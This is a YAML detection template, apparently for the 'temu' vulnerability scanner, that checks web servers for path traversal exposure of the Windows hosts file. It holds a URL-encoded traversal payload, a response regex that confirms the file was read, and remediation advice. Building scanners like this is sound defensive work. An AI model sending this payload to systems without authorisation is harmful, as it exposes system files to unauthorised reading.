schema_version: "1"
metadata:
  author: "sangkan-dev"
  license: "MIT"
  source: "https://github.com/sangkan-dev/temu"
  last_verified: "2026-05-24"
compatibility:
  minimum_temu_version: "1.3.0"
  required_capabilities: ["http"]
id: "PATH-TRAVERSAL-WINDOWS-HOSTS"
name: "Path traversal exposure (Windows hosts)"
tech_stack: []
severity: high
cvss: 7.5
payload: "/..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"
request_method: GET
verify:
  match_type: BodyRegex
  response_codes: [200]
  body_regex: "(?mi)^(?:\\d{1,3}\\.){3}\\d{1,3}\\s+localhost\\b|^#.*copyright \\(c\\).*microsoft"
cve_id: null
remediation: "Canonicalize requested paths and restrict file access to an allowlisted base directory."
references:
  - "https://owasp.org/www-community/attacks/Path_Traversal"
